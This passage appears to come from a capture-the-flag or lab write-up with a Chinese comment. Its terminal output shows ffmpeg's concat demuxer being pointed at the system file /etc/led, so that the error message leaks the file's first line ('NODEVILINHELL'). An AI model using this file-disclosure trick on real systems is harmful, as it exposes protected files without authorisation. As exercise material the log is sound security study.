  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      57. 28.100 / 57. 28.100
  libavcodec     59. 37.100 / 59. 37.100
  libavformat    59. 27.100 / 59. 27.100
  libavdevice    59.  7.100 / 59.  7.100
  libavfilter     8. 44.100 /  8. 44.100
  libswscale      6.  7.100 /  6.  7.100
  libswresample   4.  7.100 /  4.  7.100
  libpostproc    56.  6.100 / 56.  6.100
[concat @ 0x55b472e97e40] Line 1: unknown keyword 'NODEVILINHELL'
/etc/led: Invalid data found when processing input   
                                                                                                                                 
kore@hades:~$ /usr/bin/ffmpeg -f concat  -i /etc/led  
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 12 (Debian 12.2.0-14)
  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --di
sable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libd
av1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enab
le-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsn
appy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libv
px --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --e
nable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      57. 28.100 / 57. 28.100
  libavcodec     59. 37.100 / 59. 37.100
  libavformat    59. 27.100 / 59. 27.100
  libavdevice    59.  7.100 / 59.  7.100
  libavfilter     8. 44.100 /  8. 44.100
  libswscale      6.  7.100 /  6.  7.100
  libswresample   4.  7.100 /  4.  7.100
  libpostproc    56.  6.100 / 56.  6.100
[concat @ 0x561126180d80] Line 1: unknown keyword 'NODEVILINHELL'
/etc/led: Invalid data found when processing input 
```
上下俩命令一样的：
```bash
kore@hades:~$ /usr/bin/ffmpeg -f concat -safe 0 -i /etc/led
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
  built with gcc 12 (Debian 12.2.0-14)
  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --di
sable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libd
av1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enab
le-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsn
appy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libv
px --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --e
nable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      57. 28.100 / 57. 28.100
  libavcodec     59. 37.100 / 59. 37.100
  libavformat    59. 27.100 / 59. 27.100
  libavdevice    59.  7.100 / 59.  7.100
  libavfilter     8. 44.100 /  8. 44.100
  libswscale      6.  7.100 /  6.  7.100
  libswresample   4.  7.100 /  4.  7.100
  libpostproc    56.  6.100 / 56.  6.100
[concat @ 0x560db5ffce00] Line 1: unknown keyword 'NODEVILINHELL'
/etc/led: Invalid data found when processing input
```

